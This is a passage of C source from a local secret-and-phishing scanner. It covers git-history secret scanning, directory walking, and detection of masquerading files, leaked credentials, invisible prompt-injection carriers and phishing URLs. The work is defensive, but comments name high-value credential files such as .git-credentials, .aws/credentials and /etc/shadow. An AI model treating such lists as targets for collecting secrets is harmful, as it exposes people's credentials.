 * negative demonstrated through the shipped pre-commit hook. Now: if input
 * exceeds the buffer, drain the rest of stdin so a pipe writer does not
 * block on a full pipe, and print a clear warning to stderr naming how many
 * bytes were dropped so the caller knows the result is not authoritative.
 * The buffers were also enlarged to 1 MiB (see the --stdin call sites),
 * matching the shipped hook's own 1 MB file-size guard, so the demonstrated
 * gap is closed outright and the warning is a backstop for larger inputs. */
static size_t
read_stdin_all(char *buf, size_t cap) {
    size_t total = 0, r;
    if (cap == 0) return 0;
    while (total < cap - 1 &&
           (r = fread(buf + total, 1, cap - 1 - total, stdin)) > 0)
        total += r;
    buf[total] = '\0';
    if (total == cap - 1) {
        /* Buffer filled exactly — there may be more input we cannot hold.
         * Drain and count the overflow so the warning is precise, and so a
         * writer piping into us does not block on a full pipe. */
        size_t dropped = 0;
        char sink[8192];
        while ((r = fread(sink, 1, sizeof(sink), stdin)) > 0) dropped += r;
        if (dropped > 0) {
            fprintf(stderr,
                    "hlse: warning: stdin exceeded %zu-byte buffer; %zu byte(s) "
                    "dropped \xe2\x80\x94 scan of the truncated tail was skipped, "
                    "so a clean result is NOT authoritative for the full input\n",
                    cap - 1, dropped);
        }
    }
    return total;
}

/* ── Git history scanning (Perspective 111, roadmap P0-2) ──────────────────
 * `scan <dir> --git-history` finds secrets ANYWHERE in the repo's commit
 * history, not just the current working tree — the primary use case for
 * commercial secret scanners (gitleaks/trufflehog): a credential that was
 * committed and later deleted is still readable by anyone who clones the
 * repo, and a working-tree-only scan never sees it.
 *
 * Implementation: stream `git log --all -p` (every commit, unified diff,
 * every ref) and scan only ADDED lines ('+' lines, excluding the '+++'
 * file-header marker) — the lines that introduced a secret at the moment it
 * entered history. This needs one git subprocess for the whole history
 * (not one per blob), keeping it fast even on repos with thousands of
 * commits.
 *
 * Spawned via fork()+execlp(), never popen()/system(): the directory path
 * is passed as a discrete argv element to git, so it is never interpreted
 * by a shell and no combination of characters in `dir` can inject a command.
 * `git log` performs no network I/O (only fetch/pull/clone do), so this
 * preserves HLSE's zero-network-calls guarantee — verified by the existing
 * CI privacy tripwire, which traces socket-family syscalls, not process
 * spawns. */
static FILE *
git_history_open(const char *dir, pid_t *out_pid) {
    int pipefd[2];
    pid_t pid;
    if (pipe(pipefd) != 0) return NULL;
    pid = fork();
    if (pid < 0) {
        close(pipefd[0]);
        close(pipefd[1]);
        return NULL;
    }
    if (pid == 0) {
        /* Child: redirect stdout to the pipe, stderr to /dev/null (git
         * prints progress/warnings we don't want mixed into our stream). */
        int devnull;
        close(pipefd[0]);
        dup2(pipefd[1], STDOUT_FILENO);
        close(pipefd[1]);
        devnull = open("/dev/null", O_WRONLY);
        if (devnull >= 0) { dup2(devnull, STDERR_FILENO); close(devnull); }
        execlp("git", "git", "-C", dir, "log", "--all", "-p", "--no-color",
               "--full-history", (char *)NULL);
        _exit(127); /* execlp failed — git not installed / not found in PATH */
    }
    close(pipefd[1]);
    *out_pid = pid;
    return fdopen(pipefd[0], "r");
}

/* Scan every commit in `root`'s history for secrets. Returns the process
 * exit code (0 = clean, 1 = threat, 2 = usage/environment error). */
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wformat-truncation"
static int
scan_git_history(const char *root, int json_out, int sarif_out) {
    FILE *gp;
    pid_t pid;
    char line[8192];
    char commit[41] = "";
    char curpath[4096] = "";
    int commits_seen = 0, threats = 0, gate_hits = 0, max_score = 0;
    unsigned asset_mask = 0;
    int child_status;

    gp = git_history_open(root, &pid);
    if (!gp) {
        fprintf(stderr, "Error: cannot start 'git log' for '%s': %s\n",
                root, strerror(errno));
        return 2;
    }

    while (fgets(line, sizeof(line), gp)) {
        size_t n = strlen(line);
        while (n > 0 && (line[n-1] == '\n' || line[n-1] == '\r')) line[--n] = '\0';

        if (strncmp(line, "commit ", 7) == 0) {
            snprintf(commit, sizeof(commit), "%.40s", line + 7);
            commits_seen++;
            continue;
        }
        if (strncmp(line, "+++ ", 4) == 0) {
            const char *p = line + 4;
            if (strncmp(p, "b/", 2) == 0) p += 2;
            if (strcmp(p, "/dev/null") != 0) {
                /* Explicit bounded copy (not snprintf(dst, sizeof(dst), "%s",
                 * p)) — `p` derives from `line` (larger than `curpath`), and
                 * -Wformat-truncation cannot see that silent truncation here
                 * is harmless (curpath is a display label, not a real path
                 * used for I/O), so make the bound explicit instead of
                 * suppressing the warning. */
                size_t plen = strlen(p);
                if (plen >= sizeof(curpath)) plen = sizeof(curpath) - 1;
                memcpy(curpath, p, plen);
                curpath[plen] = '\0';
            } else {
                curpath[0] = '\0'; /* file was deleted in this commit */
            }
            continue;
        }
        /* An added line: starts with '+' but is not the "+++ " file header
         * and is not the empty "+" (context-only artifact). */
        if (line[0] == '+' && strncmp(line, "+++", 3) != 0 && n > 1) {
            const char *content = line + 1;
            SecretVerdict sv = hlse_scan_secrets(content);
            if (sv.score >= 40) {
                const char *spid = sv.n_findings > 0
                    ? secret_pattern_id(sv.findings[0].type)
                    : "HLSE-SECRET-GENERIC";
                const char *sdesc = sv.n_findings > 0
                    ? sv.findings[0].description : "";
                char loc[4200];
                snprintf(loc, sizeof(loc), "%s@%.7s",
                         curpath[0] ? curpath : "(unknown path)", commit);
                /* Baseline/allowlist suppression reuses the same fingerprint
                 * mechanism as the working-tree scan (P0-1); the "line" for
                 * inline hlse:allow purposes is this diff line itself. */
                if (hlse_scan_suppress(loc, spid, sdesc, content))
                    continue;
                threats++;
                if (sv.score > max_score) max_score = sv.score;
                if (sv.score >= g_fail_threshold) gate_hits++;
                {
                    int ai;
                    for (ai = 0; ai < sv.n_findings; ai++)
                        asset_mask |= asset_class_of(sv.findings[ai].type);
                }
                if (sarif_out) {
                    char msg[512] = {0};
                    int i;
                    for (i = 0; i < sv.n_findings; i++) {
                        size_t l = strlen(msg);
                        snprintf(msg + l, sizeof(msg) - l, "%s%s",
                                 i ? "; " : "", sv.findings[i].description);
                    }
                    snprintf(msg + strlen(msg), sizeof(msg) - strlen(msg),
                             " (commit %.7s)", commit);
                    sarif_add(curpath[0] ? curpath : "(unknown path)", 1,
                              "secret", spid, msg[0] ? msg : "secret", sv.score);
                } else if (json_out) {
                    int i;
                    char ep[4096], ed[512];
                    hlse_json_escape(curpath, ep, sizeof(ep));
                    printf("{\"kind\":\"secret\",\"hlse_version\":\"" HLSE_VERSION
                           "\",\"path\":\"%s\",\"commit\":\"%s\",\"score\":%d,"
                           "\"action\":\"%s\",\"severity\":%d,\"findings\":[",
                           ep, commit, sv.score, hlse_action_for_score(sv.score),
                           hlse_severity_for_score(sv.score));
                    for (i = 0; i < sv.n_findings; i++) {
                        hlse_json_escape(sv.findings[i].description, ed, sizeof(ed));
                        printf("%s{\"type\":\"%s\",\"description\":\"%s\"}",
                               i ? "," : "", sv.findings[i].type, ed);
                    }
                    printf("],\"pattern_id\":\"%s\"}\n", spid);
                } else {
                    int i;
                    printf("%-7s [%d]  %s@%.7s\n",
                           hlse_action_for_score(sv.score), sv.score,
                           curpath[0] ? curpath : "(unknown path)", commit);
                    for (i = 0; i < sv.n_findings; i++)
                        printf("  \xc2\xb7 %s\n", sv.findings[i].description);
                }
            }
        }
    }
    fclose(gp);
    /* Reap the child and distinguish real failure from a clean scan. A
     * non-zero exit with zero commits seen means `git log` itself failed
     * (not a repo, corrupt repo, etc.) — report it as a usage error rather
     * than silently printing "OK, 0 commits scanned", which would read as
     * "scanned and clean" instead of "did not scan anything at all". */
    if (waitpid(pid, &child_status, 0) == pid &&
        WIFEXITED(child_status) && WEXITSTATUS(child_status) != 0) {
        int code = WEXITSTATUS(child_status);
        if (code == 127) {
            fprintf(stderr, "Error: 'git' not found in PATH \xe2\x80\x94 "
                    "--git-history requires the git binary\n");
        } else if (commits_seen == 0) {
            fprintf(stderr, "Error: '%s' is not a git repository (git log "
                    "exited %d) \xe2\x80\x94 --git-history requires a git "
                    "repository\n", root, code);
        } else {
            /* git produced partial output before failing; still report what
             * was found, but note the scan may be incomplete. */
            fprintf(stderr, "hlse: warning: 'git log' exited %d after %d "
                    "commit(s) \xe2\x80\x94 history scan may be incomplete\n",
                    code, commits_seen);
        }
        if (commits_seen == 0) return 2;
    }

    if (sarif_out) {
        sarif_emit(HLSE_VERSION);
    } else if (json_out) {
        char ep[4096], classes[256];
        int nclasses = asset_mask_describe(asset_mask, classes, sizeof(classes));
        hlse_json_escape(root, ep, sizeof(ep));
        printf("{\"kind\":\"scan_summary\",\"hlse_version\":\"" HLSE_VERSION "\","
               "\"target\":\"%s\",\"mode\":\"git-history\","
               "\"commits_scanned\":%d,\"threats\":%d,"
               "\"max_severity\":%d,\"gate_hits\":%d,\"fail_threshold\":%d,"
               "\"asset_classes\":%d,\"blast_radius\":\"%s\"}\n",
               ep, commits_seen, threats, hlse_severity_for_score(max_score),
               gate_hits, g_fail_threshold, nclasses, classes);
    } else if (threats == 0) {
        printf("OK    %s (%d commits scanned, 0 secrets found in history)\n",
               root, commits_seen);
    } else {
        printf("\n%d secret(s) found across %d commits in %s history\n",
               threats, commits_seen, root);
        printf("\xe2\x86\x92 Immediate action: rotate every credential found above "
               "\xe2\x80\x94 they are readable in every existing clone regardless "
               "of the current working tree, and deleting the file does not "
               "remove them from history (use git filter-repo or BFG)\n");
    }
    return gate_hits > 0 ? 1 : 0;
}
#pragma GCC diagnostic pop


/* Remove `n` argv elements starting at index `i`, keeping BOTH argc and the
 * end-of-options boundary in step.
 *
 * The boundary decrement is the part that is easy to miss and expensive to get
 * wrong: every removal slides the operands left by n, so a boundary left
 * unchanged admits n operands into the flag-scanning range. Data written after
 * `--` then gets parsed as options — which is exactly the bug the `--` marker
 * exists to prevent. Doing the bookkeeping in one place is the only way this
 * invariant stays true; it previously had to be restated at eleven call sites,
 * and was wrong at all of them. */
static void
argv_remove(char **argv, int *argc, int *argc_flags, int i, int n) {
    int j;
    for (j = i; j + n < *argc; j++) argv[j] = argv[j + n];
    *argc -= n;
    if (i < *argc_flags) {
        *argc_flags -= n;
        if (*argc_flags < i) *argc_flags = i;
    }
}


/* The CLI flags every subcommand handler needs. Passing three ints beats
 * either global state or a long parameter list, and makes it explicit
 * which handlers actually care about output format. */
typedef struct { int json_out, sarif_out, quiet; } CliOpts;

/* `scan` subcommand, extracted verbatim from main(). */
static int
cmd_scan(int argc, char **argv, int idx, const CliOpts *o) {
    if (argc < idx + 2) {
        fprintf(stderr, "Usage: %s scan <directory> [--git-history]\n",
                argv[0]);
        return 2;
    }
    /* --git-history (Perspective 111 / P0-2): scan every commit in the
     * repo's history for secrets, not just the working tree. Entirely
     * different algorithm (git subprocess stream vs. directory walk),
     * so it branches out before the normal walker below. */
    if (g_git_history) {
        return scan_git_history(argv[idx + 1], o->json_out, o->sarif_out);
    }
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wformat-truncation"
    {
        const char *root = argv[idx + 1];
        int threats = 0, files_scanned = 0, max_depth = 20;
        /* Directories that exist but could not be opened. The walker skips
         * them silently, so a run over a tree it has no permission to read
         * reported "0 files scanned, 0 threats" and exited 0 — a CI gate on
         * an unreadable checkout goes green having inspected nothing. */
        int dirs_unreadable = 0;
        int gate_hits = 0;  /* findings at/above g_fail_threshold (exit gate) */
        int max_score = 0;  /* highest score seen — for max_severity in summary */
        unsigned asset_mask = 0;  /* blast-radius: classes seen across scan */
        struct stat root_st;

        /* Verify directory exists and is accessible */
        if (stat(root, &root_st) != 0) {
            fprintf(stderr, "Error: cannot access '%s': %s\n",
                    root, strerror(errno));
            return 2;
        }
        if (!S_ISDIR(root_st.st_mode)) {
            fprintf(stderr, "Error: '%s' is not a directory\n", root);
            return 2;
        }

        /* Simple iterative directory walker using a stack.
         * Avoids unbounded recursion for deeply nested trees.     */
        struct { char path[4096]; int depth; } stack[512];
        int sp = 0;

        /* cppcheck-suppress legacyUninitvar  ; snprintf writes stack[0].path, it is not read uninitialized */
        snprintf(stack[0].path, sizeof(stack[0].path), "%s", root);
        stack[0].depth = 0;
        sp = 1;

        while (sp > 0) {
            char cur_path[4096];
            int depth;
            DIR *d;
            struct dirent *ent;

            sp--;
            snprintf(cur_path, sizeof(cur_path), "%s", stack[sp].path);
            depth = stack[sp].depth;
            errno = 0;
            d = opendir(cur_path);
            if (!d) {
                /* ENOENT means it vanished between readdir and here (a real
                 * answer); anything else means we were not allowed to look. */
                if (errno != ENOENT) dirs_unreadable++;
                continue;
            }

            while ((ent = readdir(d)) != NULL) {
                char fullpath[8192];
                struct stat st;
                /* Skip only the '.' and '..' entries — NOT all dotfiles.
                 * A blanket dot-skip would silently ignore .env, .npmrc,
                 * .pypirc, .git-credentials, .aws/credentials … which are
                 * the single highest-value secret-bearing files. Dot-named
                 * directories (.git, .svn) are filtered by SKIP_DIRS below. */
                if (ent->d_name[0] == '.' &&
                    (ent->d_name[1] == '\0' ||
                     (ent->d_name[1] == '.' && ent->d_name[2] == '\0')))
                    continue;

                if (strlen(cur_path) + strlen(ent->d_name) + 2 >= sizeof(fullpath))
                    continue;  /* path too long — skip */
                snprintf(fullpath, sizeof(fullpath), "%s/%s",
                         cur_path, ent->d_name);

                /* Compute path relative to scan root for SARIF URIs.
                 * GitHub code scanning requires relative URIs so it can
                 * map findings back to repo files.                       */
                const char *sarif_path = fullpath;
                {
                    size_t rlen = strlen(root);
                    while (rlen > 1 && root[rlen - 1] == '/') rlen--;
                    if (strncmp(fullpath, root, rlen) == 0 &&
                        fullpath[rlen] == '/')
                        sarif_path = fullpath + rlen + 1;
                }

                /* lstat (not stat): a symlink is classified as S_ISLNK,
                 * so it is neither recursed into (a symlinked dir would
                 * let the scan escape the target tree or loop) nor read
                 * (a symlinked file like x.env -> /etc/shadow would leak
                 * a file outside the tree). Per SPECIFICATION.md §1.   */
                if (lstat(fullpath, &st) != 0) continue;

                if (S_ISDIR(st.st_mode)) {
                    /* Skip vendor/build directories that produce
                     * false positives and slow down scans.
                     * Same list as eslint/ruff/semgrep defaults. */
                    static const char *SKIP_DIRS[] = {
                        "node_modules", "__pycache__", ".venv",
                        "venv", "env", "vendor", "build", "dist",
                        "target", ".tox", ".mypy_cache", ".pytest_cache",
                        ".cargo", ".npm", "coverage", ".next",
                        /* VCS metadata dirs — large, binary, no secrets to
                         * surface; previously skipped by the blanket dot
                         * filter, now skipped explicitly.                  */
                        ".git", ".svn", ".hg",
                        NULL
                    };
                    int skip = 0;
                    { int k;
                      for (k = 0; SKIP_DIRS[k]; k++) {
                          if (strcmp(ent->d_name, SKIP_DIRS[k]) == 0) {
                              skip = 1; break;
                          }
                      }
                    }
                    if (skip) continue;

                    if (depth < max_depth && sp < 510) {
                        snprintf(stack[sp].path, sizeof(stack[sp].path),
                                 "%s", fullpath);
                        stack[sp].depth = depth + 1;
                        sp++;
                    }
                    continue;
                }

                if (!S_ISREG(st.st_mode)) continue;
                files_scanned++;

                /* Check 1: file masquerade */
                FileVerdict fv = hlse_check_file(fullpath);
                if (fv.score >= 40) {
                    /* P0-1: baseline/allowlist suppression. Whole-file
                     * finding — no inline-allow line context. */
                    int sup = hlse_scan_suppress(sarif_path,
                                  file_verdict_pattern_id(&fv), NULL, NULL);
                    if (sup) goto after_file_check;
                    threats++;
                    if (fv.score > max_score) max_score = fv.score;
                    if (fv.score >= g_fail_threshold) gate_hits++;
                    if (o->sarif_out) {
                        char msg[512] = {0};
                        int i;
                        for (i = 0; i < fv.n_reasons; i++) {
                            size_t l = strlen(msg);
                            snprintf(msg + l, sizeof(msg) - l, "%s%s",
                                     i ? "; " : "", fv.reasons[i]);
                        }
                        sarif_add(sarif_path, 1, "file-masquerade",
                                  file_verdict_pattern_id(&fv),
                                  msg[0] ? msg : "file masquerade", fv.score);
                    } else if (o->json_out) {
                        int i;
                        char esc[512];
                        hlse_json_escape(fullpath, esc, sizeof(esc));
                        printf("{\"kind\":\"file\",\"hlse_version\":\"" HLSE_VERSION "\","
                               "\"path\":\"%s\","
                               "\"score\":%d,\"action\":\"%s\","
                               "\"severity\":%d,\"reasons\":[",
                               esc, fv.score, hlse_action_for_score(fv.score),
                               hlse_severity_for_score(fv.score));
                        for (i = 0; i < fv.n_reasons; i++) {
                            hlse_json_escape(fv.reasons[i], esc, sizeof(esc));
                            printf("%s\"%s\"", i ? "," : "", esc);
                        }
                        printf("]");
                        if (fv.score >= 40) {
                            /* Perspective 98: matches the standalone
                             * `file` JSON path — pattern/objective/verify
                             * fire from the ALERT floor (40); triage/
                             * cascade_risk stay BLOCK+-only (60).
                             * Perspective 101: classification and the two
                             * advisory lines now come from the shared
                             * file_classify_pattern()/file_masquerade_*()
                             * accessors instead of an inline copy. */
                            const char *fpat = file_classify_pattern(&fv);
                            json_field("pattern", fpat);
                            printf(",\"pattern_id\":\"%s\"", file_pattern_id(fpat));
                            json_field("objective", file_masquerade_objective());
                            json_field("verify", file_masquerade_verify());
                        }
                        if (fv.score >= 60) {
                            static const char sf_tri[] =
                                "if already opened: disconnect from the network "
                                "immediately; run a full antivirus scan; change "
                                "credentials for any service you were logged into at "
                                "the time; consider a full OS reinstall for high-score "
                                "detections";
                            static const char sf_cas[] =
                                "all credentials and session tokens active when the file "
                                "was opened \xe2\x80\x94 malware runs with your session "
                                "context; also check for persistence (startup items, "
                                "scheduled tasks, browser extensions added)";
                            json_field("triage", sf_tri);
                            json_field("cascade_risk", sf_cas);
                        }
                        if (fv.score > 0 && fv.score < 60) {
                            const char *ex = hlse_exoneration_for("file", fv.score);
                            if (ex) {
                                json_field("exoneration", ex);
                            }
                        }
                        printf("}\n");
                    } else {
                        print_file_verdict_plain(&fv, fullpath);
                    }
                }
                after_file_check: ;  /* P0-1 suppression jump target */

                /* Check 2: secrets in text files. Large files are NOT
                 * skipped outright (a 2 MB log or DB dump routinely
                 * contains leaked credentials) — instead we scan up to a
                 * byte budget so work stays bounded on huge files.       */
                if (st.st_size > 0) {
                    /* Re-open with O_NOFOLLOW + S_ISREG (defends the
                     * lstat→open TOCTOU window); never follow a symlink
                     * swapped in after classification. */
                    FILE *fp = NULL;
                    int sfd = open(fullpath, O_RDONLY | O_NOFOLLOW | O_NONBLOCK);
                    if (sfd >= 0) {
                        struct stat sst;
                        if (fstat(sfd, &sst) == 0 && S_ISREG(sst.st_mode))
                            fp = fdopen(sfd, "r");
                        if (!fp) close(sfd);
                    }
                    if (fp) {
                        char line[4096];
                        int lineno = 0;
                        /* Bound the bytes inspected per file (8 MB) so a
                         * giant file cannot stall the scan, while still
                         * covering far more than the old 1 MB hard skip. */
                        size_t scanned_bytes = 0;
                        const size_t SCAN_BUDGET = 8u * 1024u * 1024u;
                        while (scanned_bytes < SCAN_BUDGET &&
                               fgets(line, sizeof(line), fp)) {
                            lineno++;
                            scanned_bytes += strlen(line);
                            /* Indirect prompt injection: an agent reading
                             * a repo consumes these files directly, so the
                             * poisoned-document/skill-file path runs
                             * through `scan`, not just `text`. Checked on
                             * the raw line — the carriers are invisible,
                             * so nothing else here would notice them. */
                            {
                                char inv_r[512];
                                int inv = hlse_check_invisible_carriers(
                                    line, inv_r, sizeof(inv_r));
                                if (inv > 0 &&
                                    !hlse_scan_suppress(sarif_path,
                                        "HLSE-TEXT-INVISIBLE", inv_r, line))
                                {
                                    threats++;
                                    if (inv > max_score) max_score = inv;
                                    if (inv >= g_fail_threshold) gate_hits++;
                                    if (!o->quiet && !o->json_out && !o->sarif_out) {
                                        /* Sanitize a DISPLAY copy of the
                                         * path: the real path is still
                                         * needed for file I/O, but an
                                         * attacker-named file must not
                                         * inject ANSI into the terminal
                                         * (CWE-150). */
                                        char dp[4096];
                                        snprintf(dp, sizeof dp, "%s", sarif_path);
                                        hlse_sanitize_terminal(dp);
                                        printf("  %s:%d: %s\n",
                                               dp, lineno, inv_r);
                                    }
                                }
                            }
                            SecretVerdict sv = hlse_scan_secrets(line);
                            if (sv.score >= 40) {
                                int ai;
                                /* P0-1: baseline/allowlist + inline
                                 * hlse:allow suppression. Distinguisher =
                                 * the redacted finding description (stable
                                 * per distinct secret, line-independent). */
                                const char *spid = sv.n_findings > 0
                                    ? secret_pattern_id(sv.findings[0].type)
                                    : "HLSE-SECRET-GENERIC";
                                const char *sdesc = sv.n_findings > 0
                                    ? sv.findings[0].description : "";
                                if (hlse_scan_suppress(sarif_path, spid, sdesc, line))
                                    continue;
                                threats++;
                                if (sv.score > max_score) max_score = sv.score;
                                if (sv.score >= g_fail_threshold) gate_hits++;
                                for (ai = 0; ai < sv.n_findings; ai++)
                                    asset_mask |=
                                        asset_class_of(sv.findings[ai].type);
                                if (o->sarif_out) {
                                    char msg[512] = {0};
                                    int i;
                                    for (i = 0; i < sv.n_findings; i++) {
                                        size_t l = strlen(msg);
                                        snprintf(msg + l, sizeof(msg) - l, "%s%s",
                                                 i ? "; " : "",
                                                 sv.findings[i].description);
                                    }
                                    sarif_add(sarif_path, lineno, "secret",
                                              sv.n_findings > 0
                                                ? secret_pattern_id(sv.findings[0].type)
                                                : "HLSE-SECRET-GENERIC",
                                              msg[0] ? msg : "secret", sv.score);
                                } else if (o->json_out) {
                                    int i;
                                    char esc_p[512], et[64], ed[512];
                                    hlse_json_escape(fullpath, esc_p, sizeof(esc_p));
                                    /* Emit findings:[{type,description}] per spec §5.2
                                     * (same schema as the standalone secret subcommand). */
                                    printf("{\"kind\":\"secret\","
                                           "\"hlse_version\":\"" HLSE_VERSION "\","
                                           "\"path\":\"%s\","
                                           "\"line\":%d,\"score\":%d,"
                                           "\"action\":\"%s\",\"severity\":%d,"
                                           "\"findings\":[",
                                           esc_p, lineno, sv.score,
                                           hlse_action_for_score(sv.score),
                                           hlse_severity_for_score(sv.score));
                                    for (i = 0; i < sv.n_findings; i++) {
                                        hlse_json_escape(sv.findings[i].type, et, sizeof(et));
                                        hlse_json_escape(sv.findings[i].description, ed, sizeof(ed));
                                        printf("%s{\"type\":\"%s\",\"description\":\"%s\"}",
                                               i ? "," : "", et, ed);
                                    }
                                    printf("]");
                                    {
                                        const char *conf = hlse_secret_confidence(&sv);
                                        if (conf) {
                                            json_field("confidence", conf);
                                        }
                                    }
                                    {
                                        const char *rem = hlse_remediation_for("secret", sv.score);
                                        if (rem) {
                                            json_field("remediation", rem);
                                        }
                                    }
                                    json_secret_advisories(&sv);
                                    printf("}\n");
                                } else {
                                    int i;
                                    /* Display copy only: fullpath is still
                                     * used for I/O; the terminal must not
                                     * see raw control bytes from an
                                     * attacker-chosen filename (CWE-150). */
                                    char dp[4096];
                                    snprintf(dp, sizeof dp, "%s", fullpath);
                                    hlse_sanitize_terminal(dp);
                                    printf("%-7s [%d]  %s:%d\n",
                                           hlse_action_for_score(sv.score),
                                           sv.score, dp, lineno);
                                    for (i = 0; i < sv.n_findings; i++)
                                        printf("  \xc2\xb7 %s\n",
                                               sv.findings[i].description);
                                    print_secret_advisories(&sv);
                                }
                            }

                            /* Check 3: phishing URLs embedded in text */
                            {
                                const char *p = line;
                                while ((p = strstr(p, "http")) != NULL) {
                                    if (strncmp(p, "http://", 7) != 0 &&
                                        strncmp(p, "https://", 8) != 0) {
                                        p += 4; continue;
                                    }
                                    char url_buf[2048];
                                    int ui = 0;
                                    while (p[ui] && p[ui] != ' ' && p[ui] != '\t'
                                           && p[ui] != '\n' && p[ui] != '"'
                                           && p[ui] != '\'' && p[ui] != '>'
                                           && p[ui] != ')' && ui < 2047) {
                                        url_buf[ui] = p[ui]; ui++;
                                    }
                                    url_buf[ui] = '\0';
                                    {
                                        Verdict uv = check_url(url_buf);
                                        if (uv.score >= 40) {
                                            /* P0-1: baseline/allowlist +
                                             * inline hlse:allow. Use the
                                             * relative path + url as the
                                             * distinguisher; on suppression
                                             * fall through to p += ui. */
                                            if (hlse_scan_suppress(sarif_path,
                                                    hlse_url_pattern_id(&uv),
                                                    url_buf, line))
                                                goto url_advance;
                                            threats++;
                                            if (uv.score > max_score) max_score = uv.score;
                                            if (uv.score >= g_fail_threshold)
                                                gate_hits++;
                                            if (o->sarif_out) {
                                                char msg[512] = {0};
                                                int k;
                                                size_t l0 = strlen(url_buf) < 200 ?
                                                            strlen(url_buf) : 200;
                                                snprintf(msg, sizeof(msg),
                                                         "Phishing URL: %.*s — ",
                                                         (int)l0, url_buf);
                                                for (k = 0; k < uv.n_reasons; k++) {
                                                    size_t l = strlen(msg);
                                                    snprintf(msg + l, sizeof(msg) - l,
                                                             "%s%s", k ? "; " : "",
                                                             uv.reasons[k]);
                                                }
                                                sarif_add(sarif_path, lineno,
                                                          "phishing-url",
                                                          hlse_url_pattern_id(&uv),
                                                          msg, uv.score);
                                            } else if (o->json_out) {
                                                char eu[2048];
                                                hlse_json_escape(url_buf, eu, sizeof(eu));
                                                printf("{\"kind\":\"url\",\"path\":\"%s\","
                                                       "\"line\":%d,\"url\":\"%s\","
                                                       "\"score\":%d,\"action\":\"%s\","
                                                       "\"reasons\":[",
                                                       fullpath, lineno, eu, uv.score,
                                                       hlse_action_for_score(uv.score));
                                                { int kr;
                                                  for (kr = 0; kr < uv.n_reasons; kr++) {
                                                      char er[256];
                                                      hlse_json_escape(uv.reasons[kr], er, sizeof(er));
                                                      printf("%s\"%s\"", kr>0?",":"", er);
                                                  }
                                                }
                                                printf("]");
                                                {
                                                    char ucf_buf[160];
                                                    int u_sig = hlse_confidence_for(&uv, ucf_buf, sizeof(ucf_buf));
                                                    if (u_sig > 0) {
                                                        hlse_json_escape(ucf_buf, eu, sizeof(eu));
                                                        printf(",\"signal_count\":%d,\"confidence\":\"%s\"", u_sig, eu);
                                                    }
                                                }
                                                if (uv.score >= 40) {
                                                    /* Perspective 95: pattern/pattern_id/objective/safe_url/verify
                                                     * now fire from the ALERT floor (40), matching the standalone
                                                     * URL JSON path — an embedded URL scored ALERT used to emit
                                                     * only raw reasons + exoneration while the same URL scanned
                                                     * standalone got the full advisory. triage/cascade_risk stay
                                                     * BLOCK+-only (60): post-incident guidance presumes the user
                                                     * already acted, which only high confidence warrants. */
                                                    const char *upat = hlse_classify_url_attack(&uv);
                                                    const char *uvrf = hlse_verification_for(&uv);
                                                    char uobj_buf[320], usafe[384];
                                                    int has_obj  = hlse_compound_objective(&uv, uobj_buf, sizeof(uobj_buf));
                                                    int has_safe = hlse_safe_destinations(&uv, usafe, sizeof(usafe));
                                                    if (upat)     { json_field("pattern", upat); }
                                                    if (upat)     { const char *upid = hlse_url_pattern_id(&uv); json_field("pattern_id", upid); }
                                                    if (has_obj)  { json_field("objective", uobj_buf); }
                                                    if (has_safe) { json_field("safe_url", usafe); }
                                                    if (uvrf)     { json_field("verify", uvrf); }
                                                }
                                                if (uv.score >= 60) {
                                                    const char *ucas = hlse_cascade_risk(&uv);
                                                    char utri_buf[512];
                                                    int has_tri  = hlse_compound_triage(&uv, utri_buf, sizeof(utri_buf));
                                                    if (has_tri)  { json_field("triage", utri_buf); }
                                                    if (ucas)     { json_field("cascade_risk", ucas); }
                                                }
                                                if (uv.score >= 40 && uv.score < 60) {
                                                    const char *uexon = hlse_url_exoneration(&uv);
                                                    if (uexon) {
                                                        json_field("exoneration", uexon);
                                                    }
                                                }
                                                printf("}\n");
                                            } else {
                                                int k;
                                                printf("%-7s [%d]  %s:%d  %s\n",
                                                       hlse_action_for_score(uv.score),
                                                       uv.score, fullpath, lineno, url_buf);
                                                for (k = 0; k < uv.n_reasons; k++)
                                                    printf("  \xc2\xb7 %s\n", uv.reasons[k]);
                                                print_url_advisories(url_buf, &uv);
                                                if (uv.score >= 40 && uv.score < 60) {
                                                    const char *uexon = hlse_url_exoneration(&uv);
                                                    if (uexon)
                                                        printf("  \xe2\x86\xba Could be benign: %s\n", uexon);
                                                }
                                            }
                                        }
                                    }
                                    url_advance:            /* P0-1 target */
                                    p += ui;
                                }
                            }
                        }
                        fclose(fp);
                    }
                }
            }
            closedir(d);
        }

        /* --fingerprints mode emits only the per-finding fingerprint lines
         * (for baseline generation); skip the summary and never fail the
         * gate — generating a baseline must exit 0. */
        if (g_emit_fingerprints) {
            return 0;
        }
        if (o->sarif_out) {
            sarif_emit(HLSE_VERSION);
        } else if (!o->json_out) {
            if (threats == 0) {
                const char *bs = hlse_blindspot_for("scan");
                printf("OK    %s (%d files scanned, 0 threats)\n",
                       root, files_scanned);
                if (dirs_unreadable > 0)
                    printf("  \xe2\x9a\xa0 %d director%s could not be read and "
                           "%s skipped \xe2\x80\x94 this result does not cover "
                           "%s.\n", dirs_unreadable,
                           dirs_unreadable == 1 ? "y" : "ies",
                           dirs_unreadable == 1 ? "was" : "were",
                           dirs_unreadable == 1 ? "it" : "them");
                if (bs) printf("  \xe2\x84\xb9 Blind spot: %s\n", bs);
            } else {
                char classes[256];
                int nclasses = asset_mask_describe(asset_mask, classes,
                                                   sizeof(classes));
                printf("\n%d threat(s) in %d files under %s\n",
                       threats, files_scanned, root);
                if (gate_hits > 0 && g_fail_threshold != 60)
                    printf("  %d finding(s) exceeded the --fail-on threshold (%d)\n",
                           gate_hits, g_fail_threshold);
                /* Immediate action: one-sentence triage keyed to the
                 * most severe asset class (or file/URL threats). */
                printf("\xe2\x86\x92 Immediate action: %s\n",
                       scan_immediate_action((unsigned)asset_mask, nclasses));
                /* Blast radius: credentials spanning 2+ asset classes let
                 * an attacker pivot across systems — worse than the count
                 * alone suggests. */
                if (nclasses >= 2)
                    printf("\xe2\x9a\xa0  BLAST RADIUS: leaked credentials "
                           "span %d asset classes (%s) — an attacker can "
                           "pivot across these systems. Rotate ALL of them "
                           "and assume lateral movement.\n",
                           nclasses, classes);
            }
        } else {
            /* NDJSON: final summary line for CI tooling */
            char esc_root[4096], classes[256];
            int nclasses = asset_mask_describe(asset_mask, classes,
                                               sizeof(classes));
            hlse_json_escape(root, esc_root, sizeof(esc_root));
            printf("{\"kind\":\"scan_summary\",\"hlse_version\":\"" HLSE_VERSION "\","
                   "\"target\":\"%s\","
